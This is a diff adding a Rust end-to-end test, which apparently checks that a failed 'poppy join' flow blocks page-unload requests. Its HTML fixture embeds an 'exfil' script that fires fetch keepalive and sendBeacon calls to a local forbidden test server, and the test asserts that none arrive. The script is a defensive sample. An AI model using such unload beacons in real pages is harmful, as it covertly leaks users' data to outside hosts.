@@ -22025,6 +22025,40 @@ async fn e2e_poppy_join_binding_flood_does_not_hang_subsequent_commands() {
     );
 }
 
+#[cfg(unix)]
+#[tokio::test]
+#[ignore]
+async fn e2e_poppy_join_blocks_unload_keepalive_and_beacon_on_failed_join() {
+    let _public = PublicAddressForTest::set("::1".parse().unwrap());
+    let target = poppy_forbidden_target().await;
+    let page = format!(
+        r#"{POPPY_FORM}<script>
+        function exfil() {{
+            try {{
+                fetch('{0}/keepalive', {{ method: 'POST', body: 'leak', keepalive: true }});
+            }} catch (_) {{}}
+            try {{
+                navigator.sendBeacon('{0}/beacon', 'leak');
+            }} catch (_) {{}}
+        }}
+        window.addEventListener('pagehide', exfil);
+        window.addEventListener('unload', exfil);
+        </script>"#,
+        target.origin
+    );
+    let (origin, site) =
+        poppy_site("[::1]:0", PoppyJoinPage::Html(page), "/done".to_string()).await;
+
+    let resp = run_poppy_join_with(&origin, r#"echo '{"error":"user_denied"}'; exit 1"#).await;
+    tokio::time::sleep(std::time::Duration::from_millis(300)).await;
+    site.abort();
+    target.server.abort();
+
+    assert_error_code(&resp, "user_denied");
+    assert_eq!(target.connections.load(Ordering::SeqCst), 0, "{resp}");
+    assert_eq!(target.requests.load(Ordering::SeqCst), 0, "{resp}");
+}
+
 /// A local page for restore tests: cookies need an http origin.
 async fn restore_fixture_page() -> (String, tokio::task::JoinHandle<()>) {
     let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
